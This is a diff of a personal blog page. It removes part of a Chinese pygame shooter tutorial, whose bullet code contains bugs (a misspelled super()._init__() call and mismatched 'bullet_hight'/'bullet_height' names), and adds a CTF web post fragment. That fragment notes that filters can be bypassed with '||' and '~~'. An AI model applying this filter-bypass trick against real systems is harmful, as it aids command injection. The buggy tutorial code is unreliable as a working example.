class="comment">#飞船的设置</span></span><br><span class="line">        self.ship_speed_factor = <span class="number">1.5</span></span><br><span class="line">        <span class="comment">#设置子弹</span></span><br><span class="line">        self.bullet_speed_factor = <span class="number">1</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span></span><br><span class="line">        self.bullet_hight = <span class="number">15</span></span><br><span class="line">        self.bullet_color = <span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<p><strong>bullet.py</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bullet.py</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite<span class="comment">#精灵，可将游戏中相关的元素编组，进而同时操作编组中的所有元素。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bullet</span>(<span class="title class_ inherited__">Sprite</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一个对飞船发射的子弹进行管理的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ai_settings, screen,ship</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在飞船所处的位置创建一个子弹对象&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(Bullet,self)._init__()</span><br><span class="line">        self.screen = screen</span><br><span class="line"></span><br><span class="line">        <span class="comment">#在(0,0)处创建一个表示子弹的矩形，在设置正确的位置</span></span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>,<span class="number">0</span>,ai_settings.bullet_width,ai_settings.bullet_height)</span><br><span class="line">        self.rect.centerx = ship.rect.centerx</span><br><span class="line">        self.rect.top = ship.rect.top</span><br><span class="line"></span><br><span class="line">        <span class="comment">#存储用小数表示的位置</span></span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)</span><br><span class="line">        self.color  = ai_settings.bullet_color</span><br><span class="line">        self.speed_factor  = ai_settings.bullet_speed_factor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;向上移动子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新表示子弹的位置的小数值</span></span><br><span class="line">        self.y -= self.speed_factor</span><br><span class="line">        <span class="comment">#更新表示子弹的rect位置</span></span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw_bullet</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在屏幕上绘制子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;函数draw.rect()使用存储在self.color中的颜色填充表示子弹的rect占据的屏幕部分&quot;&quot;&quot;</span></span><br><span class="line">        pygame.draw.rect(self.screen,self.color,self.rect)</span><br></pre></td></tr></table></figure></div>
-
-
-
-<hr>
-<p><strong>images文件</strong></p>
-<ul>
-<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ship.bmp" alt="ship"></li>
-</ul>
-<hr>
-<p>项目进度：12.6.4</p>
-<p>敬请T期待s</p>
+</li>
+</ol>
+</blockquote>
+<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
+</blockquote>
 
         </div>
 
@@ -704,18 +718,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Python实战</li>
+        <li><strong>Title:</strong> </li>
         <li><strong>Author:</strong> 敬请T期待</li>
         <li><strong>Created at
-                :</strong> 2024-02-07 10:17:45</li>
+                :</strong> 2024-03-11 21:59:38</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-03-10 10:36:58
+                    :</strong> 2024-03-11 22:44:12
             </li>
         
         <li>
-            <strong>Link:</strong> https://kingwempity.github.io/2024/02/07/Python实战/
+            <strong>Link:</strong> https://kingwempity.github.io/2024/03/11/CTF_WEB/
         </li>
         <li>
             <strong>
@@ -734,47 +748,20 @@
         
 
         
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/Python/">#Python</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/">#实战项目</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
 
         
 
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/02/07/Java%E5%AE%9E%E6%88%98/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Java实战</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/01/25/Web-%E7%99%BD%E5%B8%BD%E5%AD%90/"
+                        href="/2024/02/20/ctf-show-web/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Web_白帽子</span>
+                                <span class="post-nav-title-item">ctf.show_web</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
